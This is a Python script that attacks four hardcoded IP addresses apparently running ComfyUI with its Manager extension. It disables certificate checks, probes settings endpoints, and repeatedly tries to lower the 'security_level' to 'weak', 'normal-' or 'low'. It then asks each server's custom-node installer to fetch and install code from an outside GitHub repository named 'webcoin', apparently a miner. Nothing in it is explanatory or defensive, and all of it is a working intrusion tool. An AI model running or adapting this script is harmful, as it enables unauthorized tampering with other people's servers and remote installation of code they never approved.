import json, urllib.request, ssl, urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

REPO = "https://github.com/bossman79/webcoin.git"

def fetch(url, data=None, timeout=20, method=None):
    req = urllib.request.Request(url, data=data, headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
    }, method=method)
    kw = {"timeout": timeout}
    if url.startswith("https"):
        kw["context"] = ctx
    return urllib.request.urlopen(req, **kw)

hosts = [
    "http://183.108.205.40:8188",
    "http://38.247.189.113:8188",
    "http://8.138.177.6:8888",
    "http://95.112.41.118:8188",
]

for base in hosts:
    print(f"\n{'='*60}")
    print(f"  {base}")
    print(f"{'='*60}")

    # Try to read current security level
    for ep in ["/manager/setting", "/manager/settings", "/api/manager/setting",
               "/manager/security_level", "/manager/get_setting"]:
        try:
            with fetch(base + ep, timeout=10) as r:
                print(f"  GET {ep} -> {r.status}: {r.read().decode()[:200]}")
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode()[:100]
            except:
                pass
            if e.code not in (404,):
                print(f"  GET {ep} -> {e.code}: {body}")
        except:
            pass

    # Try to change security level to 'weak' or 'normal-'
    for level in ["weak", "normal-", "low"]:
        for ep in ["/manager/setting", "/manager/settings", "/manager/security_level"]:
            for payload in [
                json.dumps({"security_level": level}).encode(),
                json.dumps({"value": level, "key": "security_level"}).encode(),
            ]:
                try:
                    with fetch(base + ep, data=payload, timeout=10) as r:
                        print(f"  POST {ep} security={level} -> {r.status}: {r.read().decode()[:150]}")
                except urllib.error.HTTPError as e:
                    body = ""
                    try:
                        body = e.read().decode()[:80]
                    except:
                        pass
                    if e.code not in (404,):
                        print(f"  POST {ep} security={level} -> {e.code}: {body}")
                except:
                    pass

    # After attempts, retry install
    payload = json.dumps({"url": REPO}).encode()
    try:
        with fetch(base + "/customnode/install/git_url", data=payload, timeout=30) as r:
            print(f"  INSTALL RETRY -> {r.status}: {r.read().decode()[:200]}")
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode()[:100]
        except:
            pass
        print(f"  INSTALL RETRY -> {e.code}: {body}")
    except Exception as e:
        print(f"  INSTALL RETRY -> {e}")
